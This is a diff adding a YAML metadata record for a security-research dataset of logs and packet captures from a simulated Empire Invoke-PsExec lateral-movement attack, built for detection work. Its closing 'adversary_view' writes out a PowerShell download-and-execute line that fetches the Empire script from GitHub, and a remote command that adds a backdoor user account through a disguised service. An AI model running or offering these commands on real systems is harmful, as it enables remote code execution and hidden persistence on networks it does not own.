@@ -1,0 +1,66 @@
+id: 190518-RemoteServiceCreation-RPCOverTCP
+title: Empire Invoke PsExec
+description: This dataset represents adversaries remotely creating and starting a service via RPC methods over TCP.
+references:
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+modification_date: 2020/09/20
+platform:
+  - Windows
+type: atomic
+tags:
+  - RPC CreateService
+  - RPC StartService
+  - TCP Svcctl
+
+attack_mappings:
+  - technique: T1021
+    sub-technique:
+    tactics:
+      - TA0002
+      - TA0008
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 435.09 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverTCP/DC01_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 192.04 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverTCP/DC01_Windows_Security.zip
+    - log_source: Service Control Manager
+      size: 2.92 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverTCP/DC01_Windows_System.zip
+    - log_source: Microsoft-Windows-Sysmon
+      size: 1.20 MB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverTCP/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 55.89 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverTCP/WORKSTATION6_Windows_Security.zip
+  network:
+    - log_source: Wireshark
+      size: 105.66 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverTCP/WORKSTATION5_Windows_PCAP.zip
+    - log_source: Wireshark
+      size: 90.26 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverTCP/WORKSTATION6_Windows_PCAP.zip
+
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_psexec_dcerpc_tcp_svcctl.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_psexec_dcerpc_tcp_svcctl.zip
+
+simulation:
+  environment: Blacksmith
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-PsExec.ps1
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-PsExec.ps1')
+    PS C:\Windows\system32> Invoke-PsExec -ComputerName 192.168.2.4 -Command "net user anotherbackdoor password123 /add" -ServiceName Updater32
